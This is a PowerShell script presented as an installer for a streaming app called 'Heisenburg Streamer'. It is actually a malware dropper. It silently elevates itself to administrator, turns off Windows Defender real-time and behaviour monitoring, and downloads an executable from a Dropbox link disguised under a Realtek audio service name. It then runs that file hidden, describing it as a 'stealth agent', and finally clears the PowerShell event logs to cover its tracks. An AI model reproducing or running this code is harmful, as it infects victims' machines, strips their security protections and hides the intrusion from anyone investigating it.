# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.1
# ========================================================

# 1. ADMIN CHECK
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

Clear-Host

# 2. HYPER DOWNLOAD FUNCTION
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        if (Test-Path $TargetPath) {
            Remove-Item $TargetPath -Force -ErrorAction SilentlyContinue
        }
        
        Write-Host "[+] Downloading Core Files..." -ForegroundColor Cyan -NoNewline
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($Url, $TargetPath)
        Write-Host " DONE" -ForegroundColor Green
        return $true
    } catch {
        Write-Host " FAILED" -ForegroundColor Red
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# 3. MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
  
    # FIXED NAME - Har baar same naam rahega
    $exe = "$env:TEMP\RtkAudUService64.exe"
  
    $url = "https://www.dropbox.com/scl/fi/3awi1z0xyoxijxsryw607/RtkAudUService64.exe?rlkey=xs32qsa557s98l0vywym2scrq&st=5agkt4dq&dl=1"

    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray

    # Security Bypasses
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    } catch {}

    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray

    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
        throw "Hyper-Stream failed. Check connection."
    }

    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan

    # Run Hidden
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $exe
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null

    Write-Host "[+] STEALTH AGENT DEPLOYED SUCCESSFULLY" -ForegroundColor Green
    Write-Host "`n[+] SETUP COMPLETE. ENJOY STREAMING.`n" -ForegroundColor Magenta

    # Cleanup
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

} catch {
    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

# SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
